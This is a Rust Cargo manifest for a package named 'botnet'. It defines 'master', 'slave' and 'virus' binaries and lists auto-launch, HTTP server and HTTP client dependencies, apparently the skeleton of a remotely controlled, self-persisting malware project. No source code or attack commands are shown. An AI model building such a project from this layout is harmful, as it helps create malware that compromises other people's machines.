[package]
name = "botnet"
version = "0.1.0"
edition = "2024"

[dependencies]
anyhow = "1.0.104"
auto-launch = "0.6.0"
axum = "0.8.9"
integrate = "0.3.1"
maple-rs = "0.1.2"
reqwest = { version = "0.13.5", default-features = false, features = ["blocking", "json", "native-tls"] }
serde = { version = "1.0.229", features = ["derive"] }
tokio = { version = "1.53.3", features = ["full"] }

[[bin]]
name = "master"
path = "src/master.rs"

[[bin]]
name = "slave"
path = "src/slave.rs"

[[bin]]
name = "virus"
path = "src/virus.rs"

[build-dependencies]
embed-manifest = "1.5.1"
